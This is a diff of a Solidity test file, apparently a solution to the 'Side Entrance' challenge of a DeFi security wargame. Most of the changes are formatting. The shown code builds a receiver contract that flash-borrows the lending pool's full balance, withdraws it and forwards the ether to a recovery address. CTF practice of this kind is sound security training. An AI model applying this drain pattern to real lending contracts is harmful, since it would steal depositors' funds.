@@ -49,10 +49,6 @@ contract SideEntranceChallenge is Test {
     function test_sideEntrance() public checkSolvedByPlayer {
         FlashLoanReciever flashLoanReciever = new FlashLoanReciever(pool);
         flashLoanReciever.callFlashloan(recovery);
-
-
-
-        
     }
 
     /**
@@ -69,13 +65,10 @@ interface IFlashLoanEtherReceiver {
 }
 
 contract FlashLoanReciever is IFlashLoanEtherReceiver {
-
     SideEntranceLenderPool sideEntrance;
 
-    constructor(SideEntranceLenderPool _sideEntrance){
+    constructor(SideEntranceLenderPool _sideEntrance) {
         sideEntrance = _sideEntrance;
-
-
     }
 
     function execute() public payable {
@@ -83,7 +76,9 @@ contract FlashLoanReciever is IFlashLoanEtherReceiver {
     }
 
     function callFlashloan(address recovery) public {
-        address(sideEntrance).call{value: 0}(abi.encodeWithSelector(sideEntrance.flashLoan.selector, address(sideEntrance).balance));
+        address(sideEntrance).call{value: 0}(
+            abi.encodeWithSelector(sideEntrance.flashLoan.selector, address(sideEntrance).balance)
+        );
         sideEntrance.withdraw();
         payable(recovery).call{value: address(this).balance}("");
     }
